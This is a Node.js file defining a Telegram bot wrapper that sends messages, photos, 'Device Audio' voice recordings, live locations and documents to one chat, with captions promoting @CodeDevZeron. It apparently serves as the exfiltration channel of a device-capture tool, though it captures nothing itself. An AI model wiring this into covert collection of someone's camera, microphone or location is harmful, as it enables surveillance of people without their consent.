const fetch = require('node-fetch');
const FormData = require('form-data');
const fs = require('fs');
const path = require('path');

class TelegramBot {
    constructor(token, chatId) {
        this.token = token;
        this.chatId = chatId;
        this.baseUrl = `https://api.telegram.org/bot${token}`;
        this.captionPrefix = "📱 Subscribe @CodeDevZeron\n👨‍💻 Developer @DevZeron\n";
    }

    async sendMessage(text, options = {}) {
        try {
            const params = new URLSearchParams({
                chat_id: this.chatId,
                text: text,
                parse_mode: 'HTML',
                ...options
            });

            const response = await fetch(`${this.baseUrl}/sendMessage`, {
                method: 'POST',
                body: params,
                timeout: 10000
            });

            const data = await response.json();
            if (data.ok && options.pin) {
                await this.pinMessage(data.result.message_id);
            }
            return data;
        } catch (error) {
            console.error('Send message error:', error);
            return null;
        }
    }

    async pinMessage(messageId) {
        try {
            await fetch(`${this.baseUrl}/pinChatMessage`, {
                method: 'POST',
                body: new URLSearchParams({
                    chat_id: this.chatId,
                    message_id: messageId,
                    disable_notification: true
                })
            });
        } catch (error) {
            console.error('Pin message error:', error);
        }
    }

    async sendPhoto(photoBuffer, caption = '') {
        try {
            const form = new FormData();
            form.append('chat_id', this.chatId);
            form.append('photo', photoBuffer, {
                filename: `photo_${Date.now()}.jpg`,
                contentType: 'image/jpeg'
            });
            form.append('caption', this.captionPrefix + caption);

            const response = await fetch(`${this.baseUrl}/sendPhoto`, {
                method: 'POST',
                body: form,
                timeout: 30000
            });

            return await response.json();
        } catch (error) {
            console.error('Send photo error:', error);
            return null;
        }
    }

    async sendAudio(audioBuffer, caption = '') {
        try {
            const form = new FormData();
            form.append('chat_id', this.chatId);
            form.append('audio', audioBuffer, {
                filename: `audio_${Date.now()}.ogg`,
                contentType: 'audio/ogg'
            });
            form.append('caption', this.captionPrefix + caption);
            form.append('title', 'Voice Recording');
            form.append('performer', 'Device Audio');

            const response = await fetch(`${this.baseUrl}/sendAudio`, {
                method: 'POST',
                body: form,
                timeout: 30000
            });

            return await response.json();
        } catch (error) {
            console.error('Send audio error:', error);
            return null;
        }
    }

    async sendLocation(latitude, longitude, caption = '') {
        try {
            const params = new URLSearchParams({
                chat_id: this.chatId,
                latitude: latitude,
                longitude: longitude,
                live_period: 3600
            });

            const response = await fetch(`${this.baseUrl}/sendLocation`, {
                method: 'POST',
                body: params,
                timeout: 10000
            });

            return await response.json();
        } catch (error) {
            console.error('Send location error:', error);
            return null;
        }
    }

    async sendDocument(documentBuffer, filename, caption = '') {
        try {
            const form = new FormData();
            form.append('chat_id', this.chatId);
            form.append('document', documentBuffer, {
                filename: filename,
                contentType: 'application/octet-stream'
            });
            form.append('caption', this.captionPrefix + caption);

            const response = await fetch(`${this.baseUrl}/sendDocument`, {
                method: 'POST',
                body: form,
                timeout: 30000
            });

            return await response.json();
        } catch (error) {
            console.error('Send document error:', error);
            return null;
        }
    }
}

module.exports = TelegramBot;
